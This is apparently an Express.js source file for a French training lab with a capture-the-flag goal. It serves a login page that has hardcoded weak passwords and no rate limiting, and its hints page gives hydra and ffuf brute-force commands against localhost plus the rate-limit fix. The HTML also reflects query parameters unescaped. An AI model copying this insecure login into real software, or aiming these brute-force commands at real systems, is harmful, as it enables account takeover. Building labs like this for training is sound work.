'use strict';
// VulnLab C05 — Brute Force (pas de rate-limiting)
const express      = require('express');
const cookieParser = require('cookie-parser');
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// ⚠️ Mot de passe faible — dans les 500 premiers de rockyou.txt
const USERS = { admin: 'batman', alice: 'sunshine' };
let attempts = 0;

function page(body) {
  return `<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
<title>AdminPanel</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.1);padding:40px;width:100%;max-width:400px}
h1{font-size:20px;color:#1a2744;margin-bottom:6px;text-align:center}
.sub{font-size:13px;color:#8a94a6;text-align:center;margin-bottom:24px}
label{display:block;font-size:12px;font-weight:600;color:#4a5568;margin-bottom:5px}
input{width:100%;padding:10px 13px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:14px;margin-bottom:14px;outline:none}
input:focus{border-color:#2d6ef7}
.btn{width:100%;padding:11px;background:#2d6ef7;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
.err{background:#fef2f2;border:1px solid #fecaca;color:#991b1b;border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:14px}
.ok{background:#f0fdf4;border:1px solid #bbf7d0;color:#166534;border-radius:8px;padding:14px;font-size:13px;margin-bottom:14px}
.debug{background:#1e1e2e;border-radius:8px;padding:12px;margin-top:18px;font-family:monospace;font-size:11px;color:#a6e3a1;line-height:1.8}
.flag{font-weight:700;font-size:15px;color:#86efac}
a{color:#2d6ef7;font-size:13px;display:block;margin-top:12px;text-align:center}
</style></head><body><div class="card"><h1>AdminPanel</h1>
<p class="sub">Panneau d'administration</p>${body}
</div></body></html>`;
}

// GET / — page de login
app.get('/', (req, res) => {
  const err = req.query.err ? `<div class="err">${req.query.err}</div>` : '';
  res.send(page(`${err}
  <form method="POST" action="login">
    <label>Utilisateur</label><input name="username" placeholder="admin" value="${req.query.u || ''}">
    <label>Mot de passe</label><input type="password" name="password" placeholder="••••••">
    <button type="submit" class="btn">Connexion</button>
  </form>
  <div class="debug">⚠ Aucun rate-limiting actif<br>Tentatives : ${attempts} (jamais bloqué)<br>
  Outil suggéré : hydra, ffuf</div>
  <!-- Hints : accès via /c05/hints uniquement -->`));
});

// ⚠️ POST /login — VULNÉRABILITÉ : aucun rate-limit, aucun lockout
app.post('/login', (req, res) => {
  attempts++;
  const { username, password } = req.body;
  if (USERS[username] && USERS[username] === password) {
    // Succès → page de flag (pas de redirect pour éviter le 405)
    return res.send(page(`
      <div class="ok">✓ Connecté en tant que <strong>${username}</strong></div>
      <div class="debug">
        <span class="flag">FLAG{br0t3_f0rc3_n0_r4t3_l1m1t}</span><br>
        Mot de passe : ${password}<br>
        Tentatives totales : ${attempts}
      </div>`));
  }
  // Échec → réafficher le formulaire avec erreur (pas de redirect GET)
  const err = encodeURIComponent(`Identifiants invalides. (tentative #${attempts})`);
  const u   = encodeURIComponent(username || '');
  res.redirect(`./?err=${err}&u=${u}`);
});

app.get('/hints', (req, res) => {
  res.send(page(`
    <h2 style="font-size:16px;margin-bottom:16px;color:#1a2744">Hints C05 — Brute Force</h2>
    <p style="font-size:13px;color:#4a5568;margin-bottom:12px;line-height:1.7">
      L'endpoint <code>POST /login</code> n'a aucune protection. Utilisez hydra ou ffuf :</p>
    <div class="debug">
# hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
  localhost http-post-form \\
  "/c05/login:username=^USER^&password=^PASS^:invalides"

# ffuf
ffuf -u http://localhost/c05/login -X POST \\
  -d "username=admin&password=FUZZ" \\
  -w /usr/share/wordlists/rockyou.txt \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -fs 800

FLAG{br0t3_f0rc3_n0_r4t3_l1m1t}

# ✅ Correction : express-rate-limit
const rateLimit = require('express-rate-limit');
app.use('/login', rateLimit({ windowMs:15*60*1000, max:10 }));</div>
    <a href="./">← Retour</a>`));
});

app.listen(3000, () => console.log('[C05] port 3000'));
